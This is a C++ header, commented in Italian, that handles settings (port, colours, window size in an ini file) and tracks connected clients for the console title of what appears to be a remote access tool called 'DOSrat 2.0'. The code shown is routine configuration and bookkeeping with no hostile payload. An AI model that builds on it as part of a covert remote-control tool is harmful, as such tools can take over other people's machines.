#pragma once

// Classe per la gestione dei settaggi
class Settaggi
{
	private:
		DirUtils du;
		SettingsFile sf;
		VectSettings MenuImpostazioni;

		// Struttura contenente i colori della console
		struct COLORI
		{
			short Conferma = 10;
			short Negativo = 12;
			short Avviso = 14;
		};

	public:
		int Porta = 5555;
		bool VerificaAggiornamenti = true;
		COLORI Colori;
		COORD DimensioniFinestra{800, 600};
		
		// Costruttore
		Settaggi()
		{
			sf.SetFileName(du.GetModuleFilePath() + "settings.ini");
			MenuImpostazioni.resize(5);
		}

		// Popola i settaggi ottenendoli dal relativo file
		bool GetSettings()
		{
			if (!sf.CheckSetting("Port"))
				if (!SetSettings())
					return false;

			Porta = stoi(sf.GetSetting("Port"));
			VerificaAggiornamenti = (sf.GetSetting("CheckUpdate") == "true");
			Colori.Conferma = (short)stoi(sf.GetSetting("ColorOk"));
			Colori.Negativo = (short)stoi(sf.GetSetting("ColorError"));
			Colori.Avviso = (short)stoi(sf.GetSetting("ColorWarning"));
			DimensioniFinestra.X = (short)stoi(sf.GetSetting("WindowSizeX"));
			DimensioniFinestra.Y = (short)stoi(sf.GetSetting("WindowSizeY"));

			return true;
		}

		// Scrive i settaggi su file
		bool SetSettings()
		{
			if (!sf.CheckFile())
				return false;

			sf.SetSetting("Port", to_string(Porta));
			sf.SetSetting("CheckUpdate", (VerificaAggiornamenti) ? "true" : "false");
			sf.SetSetting("ColorOk", to_string(Colori.Conferma));
			sf.SetSetting("ColorError", to_string(Colori.Negativo));
			sf.SetSetting("ColorWarning", to_string(Colori.Avviso));
			sf.SetSetting("WindowSizeX", to_string(DimensioniFinestra.X));
			sf.SetSetting("WindowSizeY", to_string(DimensioniFinestra.Y));

			return true;
		}

		// Mostra in CLI i settaggi
		int ShowSettings()
		{
			CLInterface cli;

			MenuImpostazioni[0].Escape = true;
			MenuImpostazioni[0].Name = "Salva ed Esci";

			MenuImpostazioni[1].Name = "Porta";
			MenuImpostazioni[1].Value = to_string(Porta);
			MenuImpostazioni[1].Escape = true;

			MenuImpostazioni[2].Name = "Verifica Aggiornamenti";
			MenuImpostazioni[2].CheckValue = "true";
			MenuImpostazioni[2].Value = (VerificaAggiornamenti) ? "true" : "false";

			MenuImpostazioni[3].Name = "Imposta Colori";
			MenuImpostazioni[3].Escape = true;

			MenuImpostazioni[4].Name = "Dimensioni Finestra";
			MenuImpostazioni[4].Value = to_string(DimensioniFinestra.X);
			MenuImpostazioni[4].SecValue = to_string(DimensioniFinestra.Y);
			MenuImpostazioni[4].Escape = true;

			return cli.MenuSettings(MenuImpostazioni);
		}
};

class ClientUtils
{
public:
	int ClientCount = 0;
	enum TitleType { Menu };

private:
	Settaggi* settings;
	TitleType CurrentTitleType = Menu;

	void AggiornaCount()
	{
		ClientCount = 0;

		for (int i = 0; i < MAX_CLIENTS; i++)
			if (Clients[i].IsConnected)
				ClientCount++;
	}

public:

	ClientUtils(Settaggi& settaggi)
	{
		settings = &settaggi;
	}

	void AggiornaTitolo(TitleType tipo)
	{
		AggiornaCount();

		ConsoleUtils cu;
		string Sep = " - ";
		string Start = "DOSrat 2.0 By Criper98";
		string Clients = "Clients[" + to_string(ClientCount) + "/" + to_string(MAX_CLIENTS) + "]";
		string StatusAscolto = "In Ascolto...";
		string Porta = "Port[" + to_string(settings->Porta) + "]";

		switch (tipo)
		{
			case Menu:
				cu.ConsoleTitle(Start + Sep + Porta + " " + Clients + Sep + StatusAscolto);
				break;

			default:
				cu.ConsoleTitle(Start + Sep + Clients);
				break;
		}

		CurrentTitleType = tipo;
	}

	void AggiornaTitolo()
	{
		AggiornaTitolo(CurrentTitleType);
	}
};